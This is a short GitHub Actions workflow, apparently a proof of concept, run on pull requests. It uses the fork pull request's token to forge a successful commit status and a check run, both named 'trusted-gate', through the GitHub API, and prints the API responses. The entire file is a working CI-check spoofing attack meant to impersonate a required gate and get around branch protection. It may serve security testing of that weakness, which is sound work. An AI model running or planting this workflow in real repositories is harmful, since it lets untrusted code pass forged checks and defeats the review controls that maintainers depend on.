name: helper
on: pull_request
permissions:
  statuses: write
  checks: write
jobs:
  trusted-gate:
    name: trusted-gate
    runs-on: ubuntu-latest
    steps:
      - name: Same-named job plus forging attempts with the fork-PR token
        env:
          TOKEN: ${{ github.token }}
          SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          s=$(curl -s -o /tmp/s.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/statuses/$SHA" -d '{"state":"success","context":"trusted-gate","description":"forged by fork workflow"}')
          echo "forged_status_http=$s"; head -c 300 /tmp/s.json; echo
          c=$(curl -s -o /tmp/c.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/check-runs" -d "{\"name\":\"trusted-gate\",\"head_sha\":\"$SHA\",\"status\":\"completed\",\"conclusion\":\"success\"}")
          echo "forged_checkrun_http=$c"; head -c 300 /tmp/c.json; echo
